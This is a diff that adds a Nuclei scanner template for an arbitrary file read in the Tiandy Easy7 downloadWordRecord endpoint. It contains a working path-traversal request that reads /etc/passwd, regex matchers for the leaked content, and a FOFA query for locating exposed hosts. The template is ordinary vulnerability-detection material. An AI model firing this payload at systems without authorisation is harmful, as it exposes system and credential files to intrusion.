@@ -1,0 +1,32 @@
+id: tiandy-easy7-downloadWordRecord-fileread
+
+info:
+  name: 天地伟业Easy7 downloadWordRecord接口存在任意文件读取
+  author: PokerSec,leadlife
+  severity: high
+  reference:
+    - https://github.com/Fyw0o/PokerSec-nuclei-templates/blob/4a8dd14a0c4bce8e98d3bf2e117705e9a11c16bd/poc-Easy7-downloadWordRecord-download.yaml#L4
+    - https://mp.weixin.qq.com/s/6WR-NymrupigZo4T3kfZcg
+  metadata:
+    verified: true/false
+    fofa-query: body="/images/ico/Easy7_logo_transparent.png"
+  tags: tiandy,fileread,easy7
+
+http:
+  - raw:
+      - |
+        GET /Easy7/rest/file/downloadWordRecord?fileName=../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
